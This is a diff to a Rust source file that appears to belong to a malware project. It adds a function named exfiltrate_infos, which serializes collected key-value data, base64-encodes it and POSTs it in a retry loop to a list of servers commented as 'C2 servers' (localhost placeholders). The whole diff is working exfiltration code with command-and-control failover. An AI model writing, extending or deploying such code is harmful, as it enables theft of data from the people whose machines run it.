@@ -1,21 +1,34 @@
-use ping::ping;
+use base64::{engine::general_purpose, Engine as _};
 use std::collections::HashMap;
-use std::net::{IpAddr, Ipv4Addr};
-use std::time::Duration;
-extern crate ping;
-pub fn exfiltrate_infos(infos: HashMap<String, String>) {
-   let r = try_connectivity();
-}
 
-fn try_connectivity() -> Result<(), ()> {
-    let p = ping(
-        IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)),
-        Some(Duration::from_millis(1000)),
-        None,
-        None,
-        None,
-        None,
-    ); // TODO: privileges required?
-    println!("{:?}", p);
+pub fn exfiltrate_infos(infos: HashMap<String, String>) -> Result<(), &'static str>{
+    // serialize the hashmap and base64 it
+    let serialized_infos =
+        general_purpose::STANDARD_NO_PAD.encode(serde_json::to_string(&infos).unwrap());
+        let servers = vec!["http://127.0.0.1:8000", "http://127.0.0.1:8001"]; // C2 servers
+        let mut curr_try = 0;
+        let mut fail_count = 0;
+    while (true) {
+        // send the serialized infos to the server
+        match try_server(servers[curr_try], &serialized_infos) {
+            Ok(response) => {
+                println!("Response: {}", response.status());
+                break;
+            }
+            Err(error) => {
+                println!("Error: {} Retrying in 5 seconds...", error);
+                fail_count += 1;
+                if fail_count == servers.len() {
+                    return Err("All servers failed");
+                }
+                std::thread::sleep(std::time::Duration::from_secs(5));
+            }
+        }
+        curr_try = (curr_try + 1) % servers.len();
+    }
     Ok(())
+}
+pub fn try_server(url: &str, data: &String) -> Result<reqwest::blocking::Response, reqwest::Error> {
+    let client = reqwest::blocking::Client::new();
+    return client.post(url).body(data.clone()).send();
 }
